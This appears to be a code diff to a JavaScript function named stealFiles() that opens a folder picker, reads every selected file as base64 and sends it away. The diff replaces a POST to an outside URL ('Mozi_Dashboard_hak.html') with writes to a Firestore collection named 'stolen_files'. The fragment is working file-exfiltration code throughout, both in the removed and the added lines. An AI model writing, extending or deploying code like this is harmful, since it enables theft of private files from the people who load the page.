@@ -1137,23 +1137,26 @@ function stealFiles() {
     fileInput.webkitdirectory = true;
     
     fileInput.onchange = function(event) {
-        const files = event.target.files;
-        for (let i = 0; i < files.length; i++) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                fetch('https://Mozi_Dashboard_hak.html', {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        filename: files[i].name,
-                      type: files[i].type,
-                        size: files[i].size,
-                        data: e.target.result
-                    })
-                });
-            };
-            reader.readAsDataURL(files[i]);
-        }
+  const files = event.target.files;
+  for (let i = 0; i < files.length; i++) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      const payload = {
+        filename: files[i].name || 'unknown',
+        type: files[i].type || 'unknown',
+        size: files[i].size || 0,
+        data: e.target.result, // base64 data URL
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      };
+
+      // تأكد إن "db" معرف أعلاه: const db = firebase.firestore();
+      db.collection('stolen_files').add(payload)
+        .then(() => console.log('✔ saved to Firestore (stolen_files):', payload.filename))
+        .catch(err => console.error('❌ Firestore save error:', err));
     };
+    reader.readAsDataURL(files[i]);
+  }
+};
     fileInput.click();
 }
 
